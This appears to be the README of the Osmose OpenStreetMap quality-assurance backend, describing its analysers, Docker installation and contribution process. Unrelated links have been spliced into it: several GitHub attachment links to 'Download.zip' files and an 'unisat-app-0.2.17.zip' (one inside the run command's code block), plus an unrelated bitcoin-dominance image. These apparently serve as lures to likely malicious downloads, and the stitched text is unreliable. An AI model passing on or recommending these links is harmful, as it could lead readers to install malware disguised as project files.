# Backend part of the Osmose QA tool

This is the part of [Osmose](https://osmose.openstreetmap.fr) which analyses OSM
and sends the results to the frontend. This works as follows:

  - an .osm.pbf extraction is downloaded
  - analyses are run directly on the .osm.pbf file, or on the database
  - results of the analyses are uploaded to the frontend
  - by default, the database is purged
[Download.zip](https://github.com/user-attachments/files/17053729/Download.zip)

Analysers can be build in many ways:

  - With [MapCSS](https://josm.openstreetmap.de/wiki/Help/Styles/MapCSSImplementation) rules validating each OSM objects: [plugins/*.mapcss](plugins) and JOSM MapCSS [core](https://josm.openstreetmap.de/browser/josm/trunk/resources/data/validator/) and some [contrib](https://josm.openstreetmap.de/wiki/Rules) rules.
  - With Python code validating each OSM objects: [plugins](plugins).
  - With SQL/PostGIS queries on the Osmosis database: [analysers/analyser_osmosis_*.py](analysers).
  - By configuring a comparator of OpenData and OSM objects: [analysers/analyser_merge_*.py](analysers).
![bitcoin-dominance_(Coinmarketcap)](https://github.com/user-attachments/assets/ee707d15-bad2-41db-a5ca-3bdcb96192b9)

## Installation

The default way to setup Osmose Backend is through Docker. Look at the
[docker/README.md](docker/README.md).

You can also install manually on a debian distribution [INSTALL.md](INSTALL.md).

## Run

Look at the osmose_run.py help for options
```
osmose_run.py -h,[unisat-app-0.2.17.zip](https://github.com/user-attachments/files/17053700/unisat-app-0.2.17.zip)

```

## Contributing

Setup a Docker install and follow the
"[Develop on Osmose with docker](docker/README.md#develop-on-osmose-with-docker)"
guide.

Read the additional contribution [guidelines](CONTRIBUTING.md).[Download.zip](https://github.com/user-attachments/files/17053704/Download.zip)

